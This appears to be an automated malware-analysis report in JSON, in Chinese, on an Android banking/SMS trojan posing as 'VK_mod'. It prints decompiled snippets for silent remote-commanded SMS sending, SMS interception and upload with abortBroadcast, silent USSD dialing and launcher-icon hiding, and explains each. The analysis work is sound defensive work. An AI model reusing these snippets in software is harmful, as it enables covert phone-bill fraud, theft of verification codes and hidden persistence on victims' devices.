@@ -1,0 +1,162 @@
+{
+  "APK信息": {
+    "文件名": "bcebb1a7c4689c2412a220ebce9a8367dbdbc9b06c84edf975ef018cf729ecd1.apk",
+    "sha256": "bcebb1a7c4689c2412a220ebce9a8367dbdbc9b06c84edf975ef018cf729ecd1",
+    "包名": "com.googie.system",
+    "应用名": "VK_mod",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 389.5
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\googie\\system\\SocketService;",
+          "method_signature": "sendSms(MessageItem item)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nsmsManager.sendTextMessage(item.phone, null, item.text, sentPendingIntent, DeliverPending);",
+          "malicious_code_snippet_context": "          Intent intentDeliver = new Intent(this.DELIVERED);\n          intentDeliver.putExtra(Const.CONST_ID_SEND_SMS, item.id);\n          PendingIntent DeliverPending = PendingIntent.getBroadcast(this.ctx, reqCode, intentDeliver, 0);\n>>>         SmsManager smsManager = SmsManager.getDefault();\n>>>         try {\n              smsManager.sendTextMessage(item.phone, null, item.text, sentPendingIntent, DeliverPending);\n          } catch (Exception e) {\n              setStatusSms(item.id, Const._SMS_STATUS_EXCEPTION_SEND);",
+          "behavior_description": "该代码位于 SocketService（远程Socket通信服务）中，实现静默发送短信功能。数据流向为：C2服务器通过Socket下发任务 → MessageItem 封装目标号码与短信内容 → SmsManager.sendTextMessage() 在无用户感知的情况下静默发送短信。代码还通过 PendingIntent 监控短信发送/送达状态并回传（setStatusSms），配合 task_id 表明这是典型的远程指令驱动的短信欺诈任务系统，攻击者可远程控制受害设备向任意号码（如增值服务号码）发送短信，直接造成用户话费损失，同时 saveSmsServer 还会将短信内容上报服务器。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\googie\\system\\Receiver;",
+          "method_signature": "run()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "MessageItem message = Receiver.this.getMessage(intent.getExtras());\nReceiver.this.saveSmsServer(message.phone, message.text);\nabortBroadcast();",
+          "malicious_code_snippet_context": "                  @Override // java.lang.Runnable\n                  public void run() {\n                      try {\n>>>                         MessageItem message = Receiver.this.getMessage(intent.getExtras());\n>>>                         Receiver.this.saveSmsServer(message.phone, message.text);\n>>>                     } catch (Exception e) {\n                          e.printStackTrace();\n                      }\n                  }",
+          "behavior_description": "该代码运行在短信广播接收器中，通过子线程从短信广播 Intent 的 Extras 中提取短信内容（发送方号码 phone 和正文 text），调用 saveSmsServer() 将截获的短信内容上传到远程服务器，随后调用 abortBroadcast() 终止广播传播，使短信无法到达系统收件箱和用户界面，实现短信的隐蔽拦截。数据流向：短信广播 Intent（getExtras()）→ 提取号码与内容 → 上传远程服务器（saveSmsServer）+ 阻断广播（abortBroadcast）。此类行为常用于拦截银行验证码、支付确认短信，直接造成用户隐私泄露和财产损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\googie\\system\\SocketService;",
+          "method_signature": "ussd(String command, int id)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String encodedHash = Uri.encode(\"#\");\nString ussd = command + \"\" + encodedHash;\nIntent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussd));\nintent.addFlags(268435456);\nthis.ctx.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      private void ussd(String command, int id) {\n          try {\n>>>             String encodedHash = Uri.encode(\"#\");\n>>>             String ussd = command + \"\" + encodedHash;\n>>>             M.d(\"ussd(): \", ussd);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + ussd));\n>>>             intent.addFlags(268435456);\n              if (id > 0 && Build.VERSION.SDK_INT >= 23 && checkSelfPermission(\"android.permission.CALL_PHONE\") != 0) {\n                  setStatusSms(id, Const._SMS_STATUS_EXCEPTION_SEND);\n              } else {",
+          "behavior_description": "该方法位于SocketService（远程指令接收服务）中，接收远程C2服务器下发的USSD指令字符串(command参数)，将#号URL编码后拼接成完整USSD拨号串，然后通过ACTION_CALL Intent（非ACTION_DIAL，无需用户确认界面）直接静默发起tel:拨号执行USSD命令。数据流向：远程C2指令(SocketService下发)→Uri.parse(\"tel:\"+ussd)→startActivity(ACTION_CALL)静默拨号。该行为可被攻击者远程操控执行USSD话费转账、订阅增值业务、拨打付费号码等操作，直接造成用户经济损失，是典型的短信/银行木马远程控制行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\googie\\system\\MainActivity;",
+          "method_signature": "onClick(View v)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"com.googie.system.MainActivity\");\np.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "                  MainActivity.this.closeActivity();\n              }\n          });\n>>>         PackageManager p = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(BuildConfig.APPLICATION_ID, \"com.googie.system.MainActivity\");\n>>>         p.setComponentEnabledSetting(componentName, 2, 1);\n          if (this.app.getSid() < 1) {\n              Intent i = new Intent(this, (Class<?>) AdmActivity.class);\n              i.addFlags(268435456);",
+          "behavior_description": "应用主界面启动后立即调用 PackageManager.setComponentEnabledSetting()，将自身主组件 MainActivity 的启用状态设置为 2（COMPONENT_ENABLED_STATE_DISABLED），导致应用图标从桌面启动器中消失，用户无法看到也无法正常卸载该应用。数据流向：应用自身包名/主组件名→setComponentEnabledSetting() 禁用主组件。同时该代码还调用 startSocket() 建立网络连接（疑似C2通信）并跳转 AdmActivity，隐藏图标后恶意程序可在用户无感知的情况下后台隐蔽驻留运行，属于典型的恶意软件隐蔽与持久化技术。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
